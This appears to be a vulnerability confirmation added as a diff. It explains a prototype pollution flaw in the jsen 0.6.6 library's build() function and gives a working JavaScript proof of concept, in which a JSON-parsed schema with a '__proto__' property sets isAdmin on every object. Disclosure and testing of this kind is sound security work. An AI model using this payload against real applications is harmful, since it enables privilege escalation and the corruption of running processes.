@@ -1,0 +1,31 @@
+Confirmed: `jsen@0.6.6`'s `build()` function recursively merges schema `default` values into the target object using unguarded bracket assignment (`def[key] = defValue`), and never blacklists `__proto__`/`constructor` keys. A schema whose `properties` contains an own `"__proto__"` key (achievable via `JSON.parse`, since JSON.parse creates it as a real own property rather than triggering the prototype setter) causes the recursive `build()` call to receive `Object.prototype` itself as `def`, letting an attacker-controlled `default` value write directly onto it — polluting every object in the process.
+
+```javascript
+const jsen = require("jsen");
+
+// Attacker-controlled JSON Schema (e.g. loaded from a config/API).
+// JSON.parse gives "__proto__" as a genuine own property of `properties`,
+// unlike a JS object literal.
+const schema = JSON.parse(`{
+  "type": "object",
+  "properties": {
+    "__proto__": {
+      "type": "object",
+      "properties": {
+        "isAdmin": { "type": "boolean", "default": true }
+      }
+    }
+  }
+}`);
+
+console.log("Before: ({}).isAdmin =", ({}).isAdmin);
+
+const validate = jsen(schema);
+validate.build({}); // fills in schema defaults onto a fresh object
+
+console.log("After:  ({}).isAdmin =", ({}).isAdmin);
+
+if (({}).isAdmin === true) {
+  console.log("VULNERABLE: Object.prototype was polluted via jsen build()");
+}
+```
